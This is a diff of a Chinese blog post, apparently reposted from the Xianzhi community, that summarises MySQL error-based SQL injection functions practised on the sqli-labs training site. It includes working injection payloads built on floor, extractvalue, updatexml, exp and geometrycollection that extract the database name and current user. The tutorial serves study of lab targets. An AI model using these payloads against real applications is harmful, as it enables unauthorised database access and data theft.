@@ -15,29 +15,29 @@
 
 
 
-<meta name="description" content="前言：一直都想找个时间总结一下Mysql十大报错函数，但一直都忘了，趁着这几天玩sql-labs的时候，随便总结一下。">
+<meta name="description" content="注：本文转载自先知社区 原文链接：https://xz.aliyun.com/t/new?draftId=13637 前言：一直都想找个时间总结一下Mysql十大报错函数，但一直都忘了，趁着这几天玩sql-labs的时候，随便总结一下。 Mysql报错函数：123456789101、floor()2、extractvalue()3、updatexml()4、exp()5、geometrycolle">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Mysql报错函数小结">
 <meta property="og:url" content="http://yoursite.com/temp_posts/Mysql报错函数小结.html">
 <meta property="og:site_name" content="obsetear">
-<meta property="og:description" content="前言：一直都想找个时间总结一下Mysql十大报错函数，但一直都忘了，趁着这几天玩sql-labs的时候，随便总结一下。">
+<meta property="og:description" content="注：本文转载自先知社区 原文链接：https://xz.aliyun.com/t/new?draftId=13637 前言：一直都想找个时间总结一下Mysql十大报错函数，但一直都忘了，趁着这几天玩sql-labs的时候，随便总结一下。 Mysql报错函数：123456789101、floor()2、extractvalue()3、updatexml()4、exp()5、geometrycolle">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/img/webshell/baocuo/baocuo1.jpg">
-<meta property="og:image" content="http://yoursite.com/img/webshell/baocuo/baocuo2.jpg">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200301163537515.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="http://yoursite.com/img/webshell/baocuo/baocuo3.jpg">
-<meta property="og:image" content="http://yoursite.com/img/webshell/baocuo/baocuo4.jpg">
-<meta property="og:image" content="http://yoursite.com/img/webshell/baocuo/baocuo5.jpg">
-<meta property="og:image" content="http://yoursite.com/img/webshell/baocuo/baocuo6.jpg">
-<meta property="og:image" content="http://yoursite.com/img/webshell/baocuo/baocuo7.jpg">
-<meta property="og:image" content="http://yoursite.com/img/webshell/baocuo/baocuo8.jpg">
-<meta property="og:image" content="http://yoursite.com/img/webshell/baocuo/baocuo9.jpg">
-<meta property="og:image" content="http://yoursite.com/img/webshell/baocuo/baocuo10.jpg">
-<meta property="og:updated_time" content="2020-11-15T11:40:51.608Z">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200248-91c668a2-5bb4-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200304-9b083ddc-5bb4-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200350-b6986752-5bb4-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200406-c02c5efe-5bb4-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200501-e0d07e42-5bb4-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200531-f2d1d7f8-5bb4-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200642-1d271798-5bb5-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200754-47d94fa6-5bb5-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200811-51fad89c-5bb5-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200831-5e44234c-5bb5-1.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200847-67797444-5bb5-1.jpg">
+<meta property="og:updated_time" content="2021-02-07T13:37:42.572Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Mysql报错函数小结">
-<meta name="twitter:description" content="前言：一直都想找个时间总结一下Mysql十大报错函数，但一直都忘了，趁着这几天玩sql-labs的时候，随便总结一下。">
-<meta name="twitter:image" content="http://yoursite.com/img/webshell/baocuo/baocuo1.jpg">
+<meta name="twitter:description" content="注：本文转载自先知社区 原文链接：https://xz.aliyun.com/t/new?draftId=13637 前言：一直都想找个时间总结一下Mysql十大报错函数，但一直都忘了，趁着这几天玩sql-labs的时候，随便总结一下。 Mysql报错函数：123456789101、floor()2、extractvalue()3、updatexml()4、exp()5、geometrycolle">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200301200248-91c668a2-5bb4-1.jpg">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -324,52 +324,30 @@
 
 
           
-        <h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>一直都想找个时间总结一下Mysql十大报错函数，但一直都忘了，趁着这几天玩sql-labs的时候，随便总结一下。</p>
-<a id="more"></a>
-
+        <p><strong>注：本文转载自先知社区</strong></p>
+<p>原文链接：<a href="https://xz.aliyun.com/t/new?draftId=13637" target="_blank" rel="noopener">https://xz.aliyun.com/t/new?draftId=13637</a></p>
+<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>一直都想找个时间总结一下Mysql十大报错函数，但一直都忘了，趁着这几天玩sql-labs的时候，随便总结一下。</p>
 <h2 id="Mysql报错函数："><a href="#Mysql报错函数：" class="headerlink" title="Mysql报错函数："></a>Mysql报错函数：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、floor()</span><br><span class="line">2、extractvalue()</span><br><span class="line">3、updatexml()</span><br><span class="line">4、exp()</span><br><span class="line">5、geometrycollection()</span><br><span class="line">6、multiponint()</span><br><span class="line">7、polygon()</span><br><span class="line">8、multipolygon()</span><br><span class="line">9、linestring()</span><br><span class="line">10、multilinestring()</span><br></pre></td></tr></table></figure>
 
 <h2 id="0x01、floor"><a href="#0x01、floor" class="headerlink" title="0x01、floor()"></a>0x01、floor()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">floor(x) 函数，向下取整,返回一个不大于x的值</span><br><span class="line">round(x,d) 函数，根据四舍五入保留指定的小数位数，x指要处理的数，d是指保留几位小数。</span><br><span class="line">rand() 函数，产生一个0-1之间的随机浮点数，若有参数x，则返回一个x对应的固定的值</span><br></pre></td></tr></table></figure>
 
-<p>报错原理：主键重复</p>
-<img src="/img/webshell/baocuo/baocuo1.jpg">
-
-<img src="/img/webshell/baocuo/baocuo2.jpg">
-示例1：sql-labs第5关
-payload:
+<p>报错原理：主键重复<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200248-91c668a2-5bb4-1.jpg" alt><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200304-9b083ddc-5bb4-1.jpg" alt><br>示例1：sql-labs第5关<br>payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; union select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor(rand()*2))a from information_schema.tables group by a) b#</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20200301163537515.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200350-b6986752-5bb4-1.jpg" alt></p>
 <h2 id="0x02、extractvalue"><a href="#0x02、extractvalue" class="headerlink" title="0x02、extractvalue()"></a>0x02、extractvalue()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Extractvalue(xml_frag, xpath_expr) 函数使用XPath表示法从XML字符串中提取值</span><br><span class="line">xml_frag: 目标xml文档</span><br><span class="line">xpath_expr: 利用Xpath路径法表示的查找路径</span><br></pre></td></tr></table></figure>
 
-<p>报错原理：Xpath格式语法书写错误的话，就会报错</p>
-<img src="/img/webshell/baocuo/baocuo3.jpg">
-
-<p>示例2：<br>payload：</p>
+<p>报错原理：Xpath格式语法书写错误的话，就会报错<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200406-c02c5efe-5bb4-1.jpg" alt><br>示例2：<br>payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; union select Extractvalue(&apos;1&apos;,concat(&apos;~&apos;,(select database())))#</span><br></pre></td></tr></table></figure>
 
-<img src="/img/webshell/baocuo/baocuo4.jpg">
-
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200501-e0d07e42-5bb4-1.jpg" alt></p>
 <h2 id="0x03、updatexml"><a href="#0x03、updatexml" class="headerlink" title="0x03、updatexml()"></a>0x03、updatexml()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value) 改变文档中符合条件的节点的值</span><br><span class="line">XML_document：String格式，为XML文档对象的名称</span><br><span class="line">XPath_string ：Xpath格式的字符串</span><br><span class="line">new_value：String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure>
 
-<p>报错原理：同extractvalue函数，Xpath格式书写错误就会报错。</p>
-<img src="/img/webshell/baocuo/baocuo5.jpg">
-
-<p>示例3：<br>payload：</p>
+<p>报错原理：同extractvalue函数，Xpath格式书写错误就会报错。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200531-f2d1d7f8-5bb4-1.jpg" alt><br>示例3：<br>payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; union select updatexml(&apos;1&apos;,concat(&apos;~&apos;,(select database())),&apos;1&apos;)#</span><br></pre></td></tr></table></figure>
 
-<img src="/img/webshell/baocuo/baocuo6.jpg">
-
-<h2 id="0x04、exp"><a href="#0x04、exp" class="headerlink" title="0x04、exp()"></a>0x04、exp()</h2><p>exp()是以e为底的指数函数，但是如果传递的数太大了，当大于709时，exp()就会因为溢出而报错。</p>
-<img src="/img/webshell/baocuo/baocuo7.jpg">
-
-<p>将0按位取反就会得到“18446744073709551615”，再加上函数成功执行后返回0，我们将成功执行的函数取反就会得到最大的无符号的bigint值。</p>
-<img src="/img/webshell/baocuo/baocuo8.jpg">
-
-<p>通过子查询与按位求反，造成一个DOUBLE overflow error，由此就可以注出数据。</p>
-<img src="/img/webshell/baocuo/baocuo9.jpg">
-
-<p>但由于我这里mysql版本是5.5.53的缘故，无法成功的注出数据。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200642-1d271798-5bb5-1.jpg" alt></p>
+<h2 id="0x04、exp"><a href="#0x04、exp" class="headerlink" title="0x04、exp()"></a>0x04、exp()</h2><p>exp()是以e为底的指数函数，但是如果传递的数太大了，当大于709时，exp()就会因为溢出而报错。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200754-47d94fa6-5bb5-1.jpg" alt><br>将0按位取反就会得到“18446744073709551615”，再加上函数成功执行后返回0，我们将成功执行的函数取反就会得到最大的无符号的bigint值。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200811-51fad89c-5bb5-1.jpg" alt><br>通过子查询与按位求反，造成一个DOUBLE overflow error，由此就可以注出数据。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200831-5e44234c-5bb5-1.jpg" alt><br>但由于我这里mysql版本是5.5.53的缘故，无法成功的注出数据。</p>
 <p>成功的示例如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from products where pid=1 and exp(~(select * from(select user())a));</span><br><span class="line"> DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos;</span><br></pre></td></tr></table></figure>
 
@@ -377,10 +355,7 @@ payload:
 <p>用法：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
 
-<p>这几个函数用法均相同。<br>但是还是因为mysql版本的问题，没能成功执行。</p>
-<img src="/img/webshell/baocuo/baocuo10.jpg">
-
-<p>成功示例如下：</p>
+<p>这几个函数用法均相同。<br>但是还是因为mysql版本的问题，没能成功执行。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200301200847-67797444-5bb5-1.jpg" alt><br>成功示例如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br></pre></td></tr></table></figure>
 
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这次整理真的发现了很多问题，也学到了很多。之前还没注意，原来有些报错函数是有版本要求的，看来学习的过程中还是得多多动手才行。</p>
@@ -440,7 +415,7 @@ payload:
         <div id="footer-info">
             <div class="footer-left">
                 <i class="fa fa-copyright"></i> 
-                2016-2020 obsem
+                2016-2021 obsem
             </div>
             <div class="footer-right">
                 <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
